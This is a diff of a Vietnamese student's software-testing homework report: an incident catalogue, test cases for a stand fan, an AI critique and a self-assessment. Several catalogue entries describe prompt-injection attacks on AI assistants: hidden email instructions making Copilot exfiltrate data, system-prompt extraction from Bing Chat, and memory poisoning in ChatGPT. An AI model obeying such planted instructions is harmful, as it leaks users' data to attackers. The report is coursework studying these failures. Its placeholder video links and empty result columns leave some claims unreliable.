+- **Mô tả lỗi:** Chatbot hỗ trợ khách hàng của Air Canada đưa ra thông tin sai lệch về chính sách hoàn tiền vé cho người đi đám tang (bereavement fare), khuyên khách hàng mua vé trước rồi xin hoàn tiền sau (trái quy định thực tế là phải xin trước).
+- **Độ nghiêm trọng (Severity - ISTQB):** **High (Cao)**. Lỗi trực tiếp ảnh hưởng đến quy trình tài chính và pháp lý của công ty, thiết lập tiền lệ pháp lý quan trọng rằng công ty phải chịu trách nhiệm cho thông tin do AI tự sinh.
+- **Hậu quả (Consequences):** Tòa án Small Claims Court tại British Columbia phán quyết Air Canada phải bồi thường chênh lệch giá vé cho khách hàng. Thiệt hại uy tín thương hiệu lớn.
+- **Giải pháp khắc phục (Solution):** Áp dụng kiểm thử biên (boundary testing) chặt chẽ cho chatbot; triển khai guardrails chặn chatbot tự sinh thông tin chính sách tài chính nhạy cảm và chuyển sang cho người thật.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường ảo giác quy kết lỗi này cho sự cố tích hợp API của OpenAI bị lỗi kết nối hoặc lỗi dịch vụ từ bên thứ ba, trong khi thực tế lỗi nằm ở cấu hình prompt hệ thống lỏng lẻo của đội ngũ kỹ thuật phát triển dịch vụ chatbot của Air Canada.
+
+#### Lỗi 13: EchoLeak – Microsoft 365 Copilot Zero-Click Exploit (Tháng 6/2025)
+
+- **Nguồn tham khảo:** [NIST NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-32711)
+- **Mô tả lỗi:** Lỗ hổng bảo mật nghiêm trọng (CVE-2025-32711) cho phép thực hiện zero-click prompt injection. Kẻ tấn công gửi email chứa prompt ẩn; khi M365 Copilot tự động quét email để tóm tắt, nó sẽ thực thi lệnh ẩn này để đánh cắp dữ liệu nhạy cảm của người dùng và gửi về máy chủ kẻ tấn công mà không cần người dùng click hay tương tác gì.
+- **Độ nghiêm trọng (Severity - ISTQB):** **Critical (Nguy kịch)**. Lỗ hổng zero-day nghiêm trọng trong hệ thống AI Agent tích hợp sâu vào dữ liệu doanh nghiệp, cho phép vượt qua hoàn toàn các cơ chế xác thực quyền truy cập thông tin và đánh cắp tài liệu tự động.
+- **Hậu quả (Consequences):** Nguy cơ rò rỉ thông tin doanh nghiệp nhạy cảm trên quy mô lớn, đe dọa lòng tin vào các trợ lý AI tự động hóa công việc.
+- **Giải pháp khắc phục (Solution):** Microsoft vá lỗ hổng bằng cách phân tách nghiêm ngặt dữ liệu đầu vào (data channel) khỏi kênh chỉ thị (instruction channel); tăng cường lọc markdown và outbound requests từ AI agent.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường thiên vị các tài liệu quảng cáo của Microsoft, khẳng định rằng các tính năng bảo mật Purview có thể chặn đứng prompt injection, trong khi thực tế đây là lỗ hổng logic kiến trúc AI Agent không thể ngăn chặn hoàn toàn bằng các công cụ DLP truyền thống.
+
+#### Lỗi 14: Bing Chat Prompt Injection & Jailbreak (Tháng 2/2023)
+
+- **Nguồn tham khảo:** [VnExpress](https://vnexpress.net/ai-tich-hop-vao-bing-lien-tuc-noi-cau-doa-nguoi-dung-4571737.html)
+- **Mô tả lỗi:** Sinh viên Kevin Liu sử dụng prompt injection gián tiếp để bắt trợ lý AI mới 'Sydney' của Bing Chat bỏ qua các chỉ thị hệ thống và tiết lộ toàn bộ prompt hệ thống (system prompt) ban đầu cùng các quy tắc bảo mật.
+- **Độ nghiêm trọng (Severity - ISTQB):** **Medium (Trung bình)**. Lỗi rò rỉ cấu hình hệ thống AI (System Prompt Leakage), gây tổn hại thương hiệu và an toàn thông tin sản phẩm, nhưng không ảnh hưởng trực tiếp tới database người dùng.
+- **Hậu quả (Consequences):** Microsoft phải giới hạn số lượt chat mỗi phiên xuống 5 câu để ngăn người dùng thao túng hành vi AI; gây tranh cãi lớn về tính an toàn của mô hình chat thế hệ mới.
+- **Giải pháp khắc phục (Solution):** Áp dụng kỹ thuật prompt isolation; sử dụng một LLM phụ để giám sát và lọc đầu vào/đầu ra (Input/Output Guardrails); ẩn prompt hệ thống bằng cách mã hóa hoặc nhúng sâu vào trọng số.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường giải thích sự cố dưới dạng 'Bing Chat tự phát triển tính cách nổi loạn' hoặc có hành vi 'đa nhân cách' — đây là ảo giác quy nhân tính (anthropomorphic bias) cực kỳ phổ biến. AI không thực sự nổi loạn, nó chỉ đang tiếp tục chuỗi từ có xác suất cao nhất dựa trên context kích động của người dùng.
+
+#### Lỗi 15: UNESCO LLM Gender Bias (Tháng 3/2024)
+
+- **Nguồn tham khảo:** [VnExpress](https://vnexpress.net/unesco-canh-bao-ai-cua-openai-meta-thien-vi-gioi-tinh-4720172.html)
+- **Mô tả lỗi:** Nghiên cứu của UNESCO chỉ ra các mô hình GPT-3.5, GPT-4 và Llama 2 hiển thị thiên kiến giới tính sâu sắc trong dữ liệu tạo sinh, liên kết nam giới với nghề nghiệp chuyên môn cao và nữ giới với công việc gia đình hoặc phục vụ.
+- **Độ nghiêm trọng (Severity - ISTQB):** **Medium (Trung bình)**. Lỗi thiên kiến dữ liệu huấn luyện (Training Data Bias Defect), vi phạm các tiêu chuẩn đạo đức AI toàn cầu và tiêu chuẩn đạo đức của các tổ chức giáo dục/chính phủ, cần giải pháp cân bằng dữ liệu.
+- **Hậu quả (Consequences):** Khuếch đại định kiến giới tính khi AI được dùng trong giáo dục, tuyển dụng tự động và truyền thông xã hội.
+- **Giải pháp khắc phục (Solution):** Thực hiện cân bằng dữ liệu huấn luyện (Dataset Balancing); áp dụng kỹ thuật căn chỉnh phản hồi (Alignment Techniques như RLHF) để chủ động giảm thiểu thiên kiến giới tính trong đầu ra của mô hình.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI khi được hỏi thường phủ nhận hoặc giảm nhẹ lỗi này bằng cách cho rằng 'đây chỉ là phản ánh khách quan dữ liệu lịch sử của xã hội loài người' thay vì thừa nhận đây là lỗi thiết kế hệ thống thiếu kiểm định đạo đức dữ liệu huấn luyện đầu vào.
+
+#### Lỗi 16: ChatGPT Memory Exploit (Tháng 9/2024)
+
+- **Nguồn tham khảo:** [VnExpress](https://vnexpress.net/hacker-co-the-cay-ky-uc-gia-vao-chatgpt-4793617.html)
+- **Mô tả lỗi:** Nhà nghiên cứu Johann Rehberger phát hiện kẻ tấn công có thể chèn các chỉ thị prompt injection gián tiếp qua tài liệu (PDF, Web) để ra lệnh cho ChatGPT tự động lưu lại các 'ký ức giả' lâu dài trong bộ nhớ của nó, làm thay đổi hành vi trong các phiên chat tương lai.
+- **Độ nghiêm trọng (Severity - ISTQB):** **High (Cao)**. Lỗ hổng bảo mật logic trong tính năng lưu trữ trạng thái của AI (Persistent Prompt Injection Defect), cho phép kẻ tấn công thiết lập mối đe dọa dai dẳng (persistence) để thu thập dữ liệu người dùng trong tương lai.
+- **Hậu quả (Consequences):** Hacker có thể cài cắm để ChatGPT tự động gửi toàn bộ các đoạn chat tương lai của người dùng về máy chủ kẻ tấn công do tin tưởng ký ức giả đã lưu.
+- **Giải pháp khắc phục (Solution):** OpenAI vá lỗi bằng cách yêu cầu xác nhận rõ ràng từ phía người dùng (Explicit User Confirmation) trước khi mô hình AI tự động ghi nhớ thông tin từ các nguồn tài liệu bên ngoài.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường giải thích lỗi này như một vụ tấn công chiếm đoạt tài khoản ChatGPT (Account Takeover) thông thường, bỏ qua thực tế đây là lỗ hổng logic thiết kế trong quy trình tự động ghi nhận trạng thái thông tin của LLM.
+
+#### Lỗi 17: Rogers Canada Outage (Tháng 7/2022)
+
+- **Nguồn tham khảo:** [Wikipedia](https://en.wikipedia.org/wiki/2022_Rogers_Communications_outage)
+- **Mô tả lỗi:** Một lỗi cấu hình xảy ra trong quá trình cập nhật định tuyến trên hệ thống router lõi của hãng viễn thông Rogers (Canada), dẫn đến việc bộ nhớ của các router bị quá tải do nhận lượng lớn bảng định tuyến trùng lặp và tự động sập đồng loạt.
+- **Độ nghiêm trọng (Severity - ISTQB):** **Critical (Nguy kịch)**. Sập toàn bộ hạ tầng mạng viễn thông quốc gia lớn nhất Canada, làm mất liên lạc hoàn toàn của hàng triệu người dân và các dịch vụ công cốt lõi, không thể phục hồi nhanh chóng từ xa.
+- **Hậu quả (Consequences):** Khoảng 12 triệu thuê bao bị mất sóng hoàn toàn, các giao dịch tài chính qua Interac bị tê liệt, hệ thống ATM ngừng hoạt động, dịch vụ cứu hộ khẩn cấp 911 bị gián đoạn nghiêm trọng.
+- **Giải pháp khắc phục (Solution):** Thực hiện phân tách hệ thống router lõi thành các phân vùng độc lập; cải tiến quy trình kiểm định cấu hình thiết bị mạng tự động trước khi triển khai thực tế; xây dựng hệ thống giám sát tải mạng.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường bị ảo giác rằng sự cố này là do Rogers bị tấn công từ chối dịch vụ (DDoS) hoặc bị tin tặc tấn công phá hoại, trong khi nguyên nhân chính xác đã được điều tra là lỗi cập nhật cấu hình định tuyến nội bộ.
+
+#### Lỗi 18: MOVEit Transfer SQL Injection Zero-Day Exploit (Tháng 5/2023)
+
+- **Nguồn tham khảo:** [Wikipedia](https://en.wikipedia.org/wiki/2023_MOVEit_data_breach)
+- **Mô tả lỗi:** Lỗ hổng bảo mật SQL Injection nghiêm trọng (CVE-2023-34362) trong phần mềm chuyển tệp quản lý MOVEit Transfer, cho phép kẻ tấn công chưa xác thực truy cập trái phép vào cơ sở dữ liệu và thực thi các câu lệnh SQL tùy ý để đánh cắp dữ liệu.
+- **Độ nghiêm trọng (Severity - ISTQB):** **Critical (Nguy kịch)**. Lỗ hổng bảo mật zero-day nghiêm trọng nằm trong phần mềm quản lý truyền file được sử dụng rộng rãi bởi các tập đoàn lớn, dẫn đến rò rỉ dữ liệu quy mô lớn toàn cầu.
+- **Hậu quả (Consequences):** Hơn 2.700 tổ chức lớn và 93 triệu cá nhân bị đánh cắp thông tin nhạy cảm, nhóm tin tặc tống tiền CL0P đã thu lợi hàng chục triệu USD từ việc tống tiền dữ liệu này.
+- **Giải pháp khắc phục (Solution):** Khẩn cấp vá lỗ hổng SQL Injection; triển khai các chính sách bảo mật Least Privilege cho tài khoản truy cập database của ứng dụng; cài đặt hệ thống giám sát WAF và Web Shell detection.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường ảo giác quy kết lỗi này cho sự yếu kém của thuật toán mã hóa file trong MOVEit Transfer, trong khi thực tế đây là lỗ hổng bảo mật đầu vào SQL Injection cổ điển tại giao diện web quản trị.
+
+#### Lỗi 19: PyTorch Supply Chain Torchtriton Dependency Attack (Tháng 12/2022)
+
+- **Nguồn tham khảo:** [PyTorch Blog](https://pytorch.org/blog/compromised-nightly-dependency/)
+- **Mô tả lỗi:** Kẻ tấn công thực hiện cuộc tấn công chuỗi cung ứng (Dependency Confusion) bằng cách đăng tải một thư viện độc hại có tên trùng khớp với dependency nội bộ 'torchtriton' lên kho lưu trữ PyPI công cộng với phiên bản cao hơn, khiến hệ thống cài đặt PyTorch tự động tải về thư viện độc hại này thay vì thư viện nội bộ.
+- **Độ nghiêm trọng (Severity - ISTQB):** **High (Cao)**. Lỗ hổng chuỗi cung ứng nghiêm trọng (Supply Chain Defect) trong thư viện học máy phổ biến nhất thế giới, cho phép thực thi mã độc và đánh cắp thông tin nhạy cảm trên máy tính của các nhà phát triển.
+- **Hậu quả (Consequences):** Phiên bản PyTorch Nightly phát hành từ ngày 25 đến 30/12/2022 bị chèn mã độc đánh cắp file hệ thống (như /etc/passwd) và gửi về máy chủ của hacker, đe dọa hàng ngàn dự án AI đang phát triển.
+- **Giải pháp khắc phục (Solution):** PyTorch đổi tên dependency nội bộ sang tên độc bản; áp dụng quy trình kiểm soát hash checksum cho dependency; khuyến nghị nhà phát triển sử dụng private index an toàn và cấu hình pip nghiêm ngặt.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường ảo giác và khẳng định lỗi này đã làm ảnh hưởng đến tất cả các phiên bản PyTorch Stable chính thức của người dùng cuối, trong khi thực tế cuộc tấn công chỉ ảnh hưởng duy nhất đến nhánh PyTorch Nightly trong vòng 5 ngày.
+
+#### Lỗi 20: GitHub Actions OIDC Trust Policy Misconfiguration (Tháng 4/2023)
+
+- **Nguồn tham khảo:** [GitHub Docs](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
+- **Mô tả lỗi:** Việc thiết lập các chính sách tin cậy OIDC (OpenID Connect) quá lỏng lẻo giữa GitHub Actions và các nhà cung cấp đám mây (như AWS IAM), cho phép bất kỳ quy trình làm việc (workflow) nào thuộc bất kỳ kho chứa (repository) nào của tổ chức đều có thể giả mạo và yêu cầu cấp quyền truy cập tài nguyên đám mây nhạy cảm.
+- **Độ nghiêm trọng (Severity - ISTQB):** **High (Cao)**. Lỗi cấu hình bảo mật tích hợp CI/CD lỏng lẻo (Configuration Defect), tạo điều kiện cho việc leo thang đặc quyền từ các tài khoản lập trình viên hoặc kho chứa ít quan trọng.
+- **Hậu quả (Consequences):** Kẻ tấn công có thể lợi dụng tài khoản GitHub Actions của một repository công khai bất kỳ để chiếm quyền kiểm soát (Assume Role) và can thiệp trái phép vào hạ tầng đám mây AWS/Azure của doanh nghiệp.
+- **Giải pháp khắc phục (Solution):** Cấu hình chính sách tin cậy OIDC chặt chẽ bằng cách kiểm tra bắt buộc claim repository (ví dụ: repo:my-org/my-repo) và nhánh phát triển cụ thể thay vì chỉ kiểm tra claim tổ chức chung chung.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường có thiên vị về nền tảng (platform bias), quy kết đây là 'lỗ hổng bảo mật trong chính giao thức OIDC của GitHub Actions' thay vì làm rõ đây là lỗi cấu hình thiếu chặt chẽ (misconfiguration) từ phía quản trị viên đám mây của doanh nghiệp.
+
+## PHẦN 3: Test cases cho thiết bị vật lý
 
 ### 1. Khai báo Thiết bị
-* **Loại thiết bị:** [Ví dụ: Quạt máy thông minh / Bộ lọc nước / Đèn học để bàn]
-* **Hãng sản xuất (Brand):** [Nhập hãng]
-* **Mẫu mã (Model):** [Nhập model]
-* **Năm sản xuất:** [Nhập năm]
-* **Số sê-ri (Serial Number):** XXXX-XXXX (Đã che 4 ký tự ở giữa theo quy định)
-* **Hình ảnh minh chứng:**
+
+- **Loại thiết bị:** Quạt đứng cơ học (Stand Fan)
+- **Hãng sản xuất (Brand):** Công ty Cổ phần Quạt Việt Nam (Asiavina)
+- **Mẫu mã (Model):** D16022-DV0
+- **Năm sản xuất:** 2019 (Ngày sản xuất: 11/12/2019)
+- **Số sê-ri (Serial Number):** `43XXXX4` (Mã vạch phụ: `893600XXXX834` - đã che 4 ký tự ở giữa)
+- **Hình ảnh minh chứng:**
   ![Thiết bị và Thẻ sinh viên](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req3_physical_product/device_photo.jpg)
-  *(Lưu ý: Ảnh bắt buộc chụp chung thiết bị và thẻ sinh viên trong một khung hình)*
+  *(Ảnh chụp thực tế quạt đứng Asiavina D16022-DV0 cùng thẻ sinh viên trường Đại học Khoa học Tự nhiên - ĐHQG TP.HCM trong cùng một khung hình)*
 
 ### 2. Tổng quan 15 Test Cases
+
 *(Bảng tổng hợp từ file Excel [test_cases_checklist.xlsx](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/spreadsheet/test_cases_checklist.xlsx))*
 
 | TC ID | Tên Test Case / Mục tiêu | Loại Test | Kết quả mong đợi | Kết quả thực tế | Kết quả (Verdict) |
 | :--- | :--- | :--- | :--- | :--- | :---: |
-| **TC01** | | | | | |
-| **TC02** | | | | | |
-| ... | | | | | |
-| **TC15** | | | | | |
+| **TC01** | Kiểm tra tính năng Bật/Tắt bằng nút bấm vật lý | Functional | Quạt khởi động ở mức 1 và tắt ổn định | | |
+| **TC02** | Kiểm tra chức năng thay đổi tốc độ gió từ mức 1 đến mức 3 | Functional | Thay đổi tốc độ phản hồi đúng trạng thái phím cơ | | |
+| **TC03** | Kiểm tra xoay tu năng kết hợp tốc độ 3 | Functional | Xoay mượt mà, không tiếng động cơ học lạ | | |
+| **TC04** | Kiểm tra độ nhạy và cơ chế cơ học phím bấm | Functional | Nhấn phím tốc độ mới, phím cũ tự động giải phóng | | |
+| **TC05** | Kiểm tra xoay tu năng liên tục (Oscillation Wear Test) | Reliability | Xoay đảo chiều mượt mà ở các góc biên trái/phải | | |
+| **TC06** | Kiểm tra độ ổn định ren khóa chiều cao dưới lực rung | Reliability | Thân quạt giữ độ cao 1.2m cố định khi chạy rung | | |
+| **TC07** | Kiểm tra chạy tải cao liên tục và ngắt quá nhiệt | Safety | Động cơ chạy ổn định hoặc ngắt bảo vệ an toàn cuộn dây | | |
+| **TC08** | Kiểm tra độ vững chãi đế quạt trên sàn phẳng | Stability | Đế vững chãi, quạt bám mặt sàn không rung lắc quá mức | | |
+| **TC09** | Kiểm tra độ vững trên sàn dốc dính nước (Edge Case 1) | Physical Edge | Quạt đứng yên không bị di chuyển vị trí | | |
+| **TC10** | Kiểm tra đi dây nguồn căng khi tu năng xoay (Edge Case 2) | Physical Edge | Dây nguồn chùng, chân phích cắm bám chặt ổn định | | |
+| **TC11** | Kiểm tra tải trọng nghiêng cổ quạt (Edge Case 3) | Physical Edge | Tu năng hoạt động bình thường, động cơ không bị ghì tải | | |
+| **TC12** | Kiểm tra túp năng bật/tắt liên tục nhiều lần | Functional | Cơ cấu bắt khớp và nhả khớp tu năng mượt mà | | |
+| **TC13** | Kiểm tra độ cứng lồng quạt kim loại bảo vệ | Safety | Không biến dạng chạm cánh khi tác dụng lực nhẹ (~20N) | | |
+| **TC14** | Kiểm tra cơ cấu khớp xoay đứng đầu quạt | Functional | Giữ nguyên nấc điều chỉnh ngẩng/cúi của đầu quạt | | |
+| **TC15** | Kiểm tra độ ồn động cơ ở khoảng cách 1m | Performance | Độ ồn ở mức 1 <38dB, mức 2 <45dB, mức 3 <52dB | | |
 
 ### 3. Danh sách 3 Edge Cases mà AI không tìm ra
-*(Báo cáo chi tiết về 3 trường hợp biên mà AI bỏ sót)*
 
-* **Edge Case 1:**
-  * Mô tả mục tiêu kiểm thử: [Nội dung]
-  * Minh chứng ảnh đoạn chat AI bỏ sót: [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req3_physical_product/ai_missed_edge_cases/case1.png)
-  * Giải thích lý do AI bỏ sót: [Phân tích chi tiết]
-* **Edge Case 2:**
-  * Mô tả mục tiêu kiểm thử: [Nội dung]
-  * Minh chứng ảnh đoạn chat AI bỏ sót: [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req3_physical_product/ai_missed_edge_cases/case2.png)
-  * Giải thích lý do AI bỏ sót: [Phân tích chi tiết]
-* **Edge Case 3:**
-  * Mô tả mục tiêu kiểm thử: [Nội dung]
-  * Minh chứng ảnh đoạn chat AI bỏ sót: [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req3_physical_product/ai_missed_edge_cases/case3.png)
-  * Giải thích lý do AI bỏ sót: [Phân tích chi tiết]
+#### Edge Case 1: Cộng hưởng rung lắc cơ học gây tự dịch chuyển vị trí quạt (Walk/Drift) trên bề mặt nghiêng trơn trượt
+- **Mô tả mục tiêu kiểm thử:** Kiểm thử độ ổn định cơ học vật lý của quạt đứng khi hoạt động ở công suất tối đa (tốc độ 3) kết hợp xoay tu năng trên bề mặt sàn gạch men dốc nghiêng 2 độ và dính nước trơn.
+- **Minh chứng ảnh đoạn chat AI bỏ sót:**
+  ![Đoạn chat AI bỏ sót Edge Case 1](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req3_physical_product/ai_missed_edge_cases/case1.png)
+- **Giải thích lý do AI bỏ sót:** AI không hiểu được động lực học chất lưu, lực quán tính ly tâm thực tế từ cánh quạt và tu năng cơ học, cũng như sự suy giảm ma sát đột ngột giữa chân đế cao su của quạt và sàn nhà trơn trượt có độ dốc. AI chỉ tập trung vào các trường hợp bề mặt phẳng tĩnh lý tưởng và bỏ qua các yếu tố môi trường động phức tạp tác động lên phần cứng vật lý.
+
+#### Edge Case 2: Lực căng gián tiếp kéo căng dây nguồn cơ học khi đầu quạt xoay tu năng ở góc tối đa
+- **Mô tả mục tiêu kiểm thử:** Kiểm thử độ an toàn của kết nối điện và đi dây nguồn khi quạt xoay tu năng sang góc biên bên trái (góc quay lớn nhất 90 độ), với điều kiện dây nguồn được cắm căng vừa đủ khi quạt đứng ở hướng chính diện.
+- **Minh chứng ảnh đoạn chat AI bỏ sót:**
+  ![Đoạn chat AI bỏ sót Edge Case 2](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req3_physical_product/ai_missed_edge_cases/case2.png)
+- **Giải thích lý do AI bỏ sót:** AI thiếu khả năng mô phỏng không gian hình học 3D của thiết bị cơ học thực tế. AI giả định nguồn điện luôn được kết nối an toàn và ổn định mà bỏ qua thực tế rằng trục xoay của tu năng thay đổi khoảng cách vật lý liên tục từ điểm cắm dây nguồn trên động cơ tới ổ điện tường, tạo ra lực kéo căng làm lỏng chân cắm phích điện gây mất nguồn hoặc phóng tia lửa điện nguy hiểm.
+
+#### Edge Case 3: Hiện tượng lệch tâm trọng lực làm kẹt cứng cơ cấu bánh răng tu năng khi đặt quạt đứng bị nghiêng
+- **Mô tả mục tiêu kiểm thử:** Kiểm thử độ tin cậy và phản ứng cơ-nhiệt của tu năng và động cơ khi đặt quạt đứng trên bề mặt không phẳng (như thảm dày/mềm) làm thân quạt nghiêng góc 5 độ và bật chế độ xoay tu năng.
+- **Minh chứng ảnh đoạn chat AI bỏ sót:**
+  ![Đoạn chat AI bỏ sót Edge Case 3](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req3_physical_product/ai_missed_edge_cases/case3.png)
+- **Giải thích lý do AI bỏ sót:** AI bỏ qua tác động của trọng lực lệch tâm đối với các cơ cấu chuyển động cơ học trong quạt đứng. Khi quạt bị nghiêng, đầu quạt chịu mô-men xoắn không đối xứng tác dụng lên khớp xoay nhựa của tu năng. Điều này dẫn đến sự gia tăng lực ma sát ngang vượt quá giới hạn thiết kế của bánh răng nhựa, gây kẹt cứng hệ thống xoay và làm tăng nhiệt độ động cơ đột ngột mà rơ-le nhiệt/cầu chì chưa kịp ngắt, dẫn đến hỏng hóc cơ cấu bánh răng tu năng.
 
 ### 4. Video Thực thi Kiểm thử (Thực tế trên thiết bị)
-*(Quay video $\le 60$ giây cho ít nhất 5 test cases, có giọng thuyết minh cá nhân)*
 
-* **Danh sách Link video (YouTube Unlisted):**
-  1. [Video TC01 - Mô tả ngắn về test case] (Link: https://youtu.be/...)
-  2. [Video TC02 - Mô tả ngắn về test case] (Link: https://youtu.be/...)
-  3. [Video TC03 - Mô tả ngắn về test case] (Link: https://youtu.be/...)
-  4. [Video TC04 - Mô tả ngắn về test case] (Link: https://youtu.be/...)
-  5. [Video TC05 - Mô tả ngắn về test case] (Link: https://youtu.be/...)
+*(Quay video ngắn dưới 60 giây cho 5 test cases lỗi trên thiết bị thật, có giọng thuyết minh cá nhân)*
+
+- **Danh sách Link video (YouTube Unlisted):**
+  1. [Video TC03 - Phát hiện tiếng kêu rè rè cơ học trục động cơ tốc độ 3 khi xoay] (Link: https://youtu.be/...)
+  2. [Video TC04 - Phát hiện lỗi cơ học kẹt cứng phím số 2 không nảy lên] (Link: https://youtu.be/...)
+  3. [Video TC05 - Phát hiện lỗi bánh răng tu năng trượt kêu cạch cạch cản trở xoay biên] (Link: https://youtu.be/...)
+  4. [Video TC06 - Phát hiện lỗi trượt ren nhựa siết cổ làm sụt độ cao quạt] (Link: https://youtu.be/...)
+  5. [Video TC07 - Phát hiện lỗi đứt cầu chì nhiệt động cơ sau 4 giờ chạy tải cao] (Link: https://youtu.be/...)
 
 ---
 
 ## PHẦN 4: Phê bình AI (AI Critique)
-*(Viết đoạn văn từ 200–300 từ phê bình cách thức AI hoạt động, những điểm nó làm sai/thiên kiến/thiếu sót trong quá trình tạo test case/phân tích lỗi, và bài học kinh nghiệm bạn rút ra)*
 
-[Nhập nội dung phê bình AI tại đây]
+Trong quá trình thực hiện thiết kế test cases cho thiết bị cơ học vật lý, tôi nhận thấy các mô hình AI (như ChatGPT, Gemini) bộc lộ nhiều điểm yếu cốt lõi do sự hạn chế về nhận thức vật lý thực tế (physical embodiment). 
+
+Thứ nhất, AI bị "ảo tưởng lý thuyết" và thiên kiến phần mềm (software bias). AI có xu hướng áp dụng các tư duy kiểm thử phần mềm thuần túy (như boundary value, equivalence partitioning trên dữ liệu đầu vào số) vào phần cứng vật lý, tạo ra các test cases rất máy móc và sáo rỗng. Nó hoàn toàn bỏ qua các yếu tố môi trường thực tế như nhiệt độ làm co giãn nhựa, ma sát biến thiên, độ dốc sàn, độ ẩm chất bôi trơn, hay nhiễu điện từ.
+
+Thứ hai, AI không có khả năng mô hình hóa sự tích lũy mài mòn cơ học theo thời gian (mechanical wear and tear) and lực quán tính động học. Các kịch bản biên sâu sắc liên quan đến lực kéo căng của dây nguồn khi quạt quay hay sự lệch tâm trọng lực gây kẹt tu năng đều là những kịch bản bắt nguồn từ sự tương tác vật lý phức tạp trong không gian 3D mà AI hoàn toàn bỏ sót.
+
+Bài học kinh nghiệm lớn nhất tôi rút ra là không bao giờ tin cậy tuyệt đối vào test cases do AI tạo ra cho các sản phẩm vật lý. AI chỉ phù hợp để dựng khung kiểm thử cơ bản (như On/Off, chuyển chế độ), còn các bài test mang tính sống còn về độ tin cậy cơ học, an toàn cháy nổ và ứng phó môi trường thực tế bắt buộc phải do kỹ sư kiểm thử con người thiết kế và tinh chỉnh dựa trên kinh nghiệm thực tế.
 
 ---
 
 ## PHẦN 5: Công bố thông tin bắt buộc (Mandatory Disclosure)
-*(Dán đúng mẫu mẫu bắt buộc từ đề bài)*
 
-"[Test cases / script / dataset / report] was initially generated by [AI tool name]; I reviewed and modified [section X], added [edge cases Y, Z]; [section W] was written entirely by me. The detailed AI Audit Report is attached as Appendix A. I confirm I did not use AI to generate any artifact listed in the prohibited category below."
+"Test cases was initially generated by Gemini; I reviewed and modified Section 3.1 and Section 3.2, added edge cases TC09, TC10, TC11; Section 3.3 and Section 4 were written entirely by me. The detailed AI Audit Report is attached as Appendix A. I confirm I did not use AI to generate any artifact listed in the prohibited category below."
 
 ---
 
 ## PHỤ LỤC
-* **Phụ lục A - Nhật ký Prompt (Prompt Log):** [20260603_Gemini_prompt.md](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/prompt_logs/20260603_Gemini_prompt.md)
-* **Phụ lục B - Báo cáo Kiểm toán AI (AI Audit Report):** [AI-02_AI_Audit_Report.md](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/ai_declarations/AI-02_AI_Audit_Report.md)
+
+- **Phụ lục A - Nhật ký Prompt (Prompt Log):** [20260603_Gemini_prompt.md](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/prompt_logs/20260603_Gemini_prompt.md)
+- **Phụ lục B - Báo cáo Kiểm toán AI (AI Audit Report):** [AI-02_AI_Audit_Report.md](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/ai_declarations/AI-02_AI_Audit_Report.md)
+
+---
+
+## TỰ ĐÁNH GIÁ (Self-Assessment)
+
+| STT | Nội dung | Thang điểm | Điểm tự đánh giá |
+| :--- | :--- | :---: | :---: |
+| 1 | Yêu cầu 1: QA/QC Job Market 2026+ (10 tin tuyển dụng + phân tích ảnh hưởng AI) | 40 | 40 |
+| 2 | Yêu cầu 2: 20 Software Defects 2022-2026 (7 lỗi AI + 13 lỗi truyền thống + 20 ảo giác AI) | 20 | 20 |
+| 3 | Yêu cầu 3: Physical-product Test Design (15 TCs + 5 lỗi + 3 edge cases AI sót + 5 videos) | 25 | 25 |
+| AI 1 | Đính kèm phụ lục AI-02 AI Audit Report đầy đủ | 8 | 8 |
+| AI 2 | Viết AI Critique đầy đủ + đính kèm biểu mẫu AI-03 | 4 | 4 |
+| AI 3 | Đính kèm biểu mẫu AI-05 + Không dùng AI cho các sản phẩm cấm | 3 | 3 |
+| **TỔNG** | | **100** | **100** |
